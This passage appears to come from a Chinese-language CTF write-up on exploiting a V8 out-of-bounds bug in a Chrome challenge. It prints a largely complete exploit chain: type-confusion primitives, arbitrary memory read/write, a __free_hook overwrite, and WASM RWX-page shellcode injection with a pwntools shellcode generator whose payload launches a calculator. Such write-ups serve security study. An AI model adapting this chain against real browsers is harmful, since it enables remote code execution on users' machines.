	<span class="token keyword">return</span> float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//hex</span>
<span class="token keyword">function</span> <span class="token function">hex</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> i<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">//create fake array obj</span>
<span class="token keyword">var</span> fake_array <span class="token operator">=</span> <span class="token punctuation">[</span>
    float_array_map<span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x41414141n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x1000000000n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">1.1</span><span class="token punctuation">,</span>
    <span class="token number">2.2</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> fake_obj_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x40n</span> <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">;</span>
<span class="token comment">//console.log('fake_obj_addr = ' + hex(fake_obj_addr));</span>
<span class="token keyword">var</span> fake_obj <span class="token operator">=</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token function">f2i</span><span class="token punctuation">(</span>fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>	
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf_backing_store_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span> <span class="token operator">+</span> <span class="token number">0x20n</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">write64_view</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> code_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x30n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'code_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>code_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> v8_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>code_addr <span class="token operator">+</span> <span class="token number">0x42n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> v8_base <span class="token operator">=</span> v8_addr <span class="token operator">-</span> <span class="token number">0x94f780n</span> <span class="token operator">-</span> <span class="token number">0x679000n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'v8_base = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>v8_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> free_got_addr <span class="token operator">=</span> v8_base <span class="token operator">+</span> <span class="token number">0x12aa8b8n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'free_got = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>free_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> free_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>free_got_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'free = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>free_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> lbase <span class="token operator">=</span> free_addr <span class="token operator">-</span> <span class="token number">0x9d850n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x1eeb28n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> system <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x55410n</span><span class="token punctuation">;</span>

<span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//%SystemBreak();</span>

<span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>成功执行命令弹出计算器：<br><img src="/images/3b546c3b/pasted-27.png" alt="pwn1"></p>
<p>题目的 chrome 可执行文件，got 表的偏移不太一样，修改后，泄露地址都是正确的，但是不知道为什么这种方式没有成功弹出计算器</p>
<h4 id="非传统利用方式"><a href="#非传统利用方式" class="headerlink" title="非传统利用方式"></a>非传统利用方式</h4><p>另一种方式和 WASM 有关系，首先利用这个网站 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://wasdk.github.io/WasmFiddle/，生成一段">https://wasdk.github.io/WasmFiddle/，生成一段</a> wasm<br><img src="/images/3b546c3b/pasted-28.png" alt="pwn2_1"></p>
<p>调试下面代码</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，执行了 WASM 输出了 main 函数的返回值 42<br><img src="/images/3b546c3b/pasted-29.png" alt="pwn2_2"></p>
<p>但是 WASM 肯定是不能想执行什么就执行什么的，浏览器是不允许 WASM 直接调用系统函数的，只能做一些数学计算等，但是 WASM 管理了一块 RWX 属性的内存段，每当调用 WASM 的函数，都会从这里开始执行指令，如果将这里改写为构造好的 shellcode，那么就可以达成执行任意 shellcode 的目的了</p>
<p>这里调试跟踪一下这块 RWX 内存的位置，首先查看 main 函数对象，找到 shared_info<br><img src="/images/3b546c3b/pasted-30.png" alt="pwn2_3"></p>
<p>再通过 shared_info 找到 data<br><img src="/images/3b546c3b/pasted-31.png" alt="pwn2_4"></p>
<p>再通过 data 找到 instance<br><img src="/images/3b546c3b/pasted-32.png" alt="pwn2_5"></p>
<p>在 instance 的固定偏移处可以找到这个 RWX 段的地址，这个固定偏移因编译参数环境等而异，本道题目则是 <code>+0x88</code><br><img src="/images/3b546c3b/pasted-33.png" alt="pwn2_6"></p>
<p>最后代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'f_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>f_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> shared_info_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>f_addr <span class="token operator">+</span> <span class="token number">0x18n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_exported_func_data_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>shared_info_addr <span class="token operator">+</span> <span class="token number">0x8n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_instance_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_exported_func_data_addr <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_instance_addr <span class="token operator">+</span> <span class="token number">0x88n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'rwx_page_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span> 
<span class="token comment">//shellcode</span>
<span class="token punctuation">]</span>


<span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf_backing_store_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span> <span class="token operator">+</span> <span class="token number">0x20n</span><span class="token punctuation">;</span>

<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//%SystemBreak();</span>

<span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//pwn</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后就差 shellcode 了，这里写了一个脚本用来生成 shellcode，代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


<span class="token keyword">def</span> <span class="token function">just8</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    real_size <span class="token operator">=</span> size <span class="token keyword">if</span> size <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> size <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> size <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>real_size<span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">to_js</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ret <span class="token operator">=</span> <span class="token string">'var sc_arr = ['</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            ret <span class="token operator">+=</span> <span class="token string">'\n'</span>
        x <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        
        ret <span class="token operator">+=</span> <span class="token string">'\t'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'n,'</span>

    ret <span class="token operator">+=</span> <span class="token string">'\n]\n'</span>

    <span class="token keyword">return</span> ret


<span class="token keyword">def</span> <span class="token function">call_exec</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sc <span class="token operator">=</span> <span class="token string">''</span>
    
    sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>pushstr<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
    sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>mov<span class="token punctuation">(</span><span class="token string">'rdi'</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">)</span>
    
    sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>pushstr_array<span class="token punctuation">(</span><span class="token string">'rsi'</span><span class="token punctuation">,</span> argv<span class="token punctuation">)</span>
    sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>pushstr_array<span class="token punctuation">(</span><span class="token string">'rdx'</span><span class="token punctuation">,</span> envp<span class="token punctuation">)</span>
    sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>syscall<span class="token punctuation">(</span><span class="token string">'SYS_execve'</span><span class="token punctuation">)</span>
 
    <span class="token keyword">return</span> sc

context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>


sc <span class="token operator">=</span> <span class="token string">''</span>
sc <span class="token operator">=</span> call_exec<span class="token punctuation">(</span><span class="token string">'/usr/bin/xcalc'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'xcalc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'DISPLAY=:0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span>

data <span class="token operator">=</span> asm<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>
data <span class="token operator">=</span> just8<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>to_js<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>要注意的是，很多初学者都会遇到一个问题，execve 没法弹计算器，这是因为执行图形程序需要一个环境变量 DISPLAY，用来指定图形输出的设备，一般情况下写 <code>DISPLAY=:0</code> 即可</p>
<p>最终完整 exp 如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj_array <span class="token operator">=</span> <span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// leak map</span>
<span class="token keyword">var</span> obj_array_map <span class="token operator">=</span> obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array_map <span class="token operator">=</span> float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token comment">//leak address of obj</span>
<span class="token comment">//obj_to_leak: Object</span>
<span class="token comment">//return: integer</span>
<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj_to_leak</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj_to_leak<span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//类型混淆</span>

	<span class="token keyword">let</span> obj_addr <span class="token operator">=</span> obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//恢复类型</span>

	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//create fake object</span>
<span class="token comment">//addr_to_fake: interger</span>
<span class="token keyword">function</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span><span class="token parameter">addr_to_fake</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

	float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr_to_fake<span class="token punctuation">)</span><span class="token punctuation">;</span>
	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

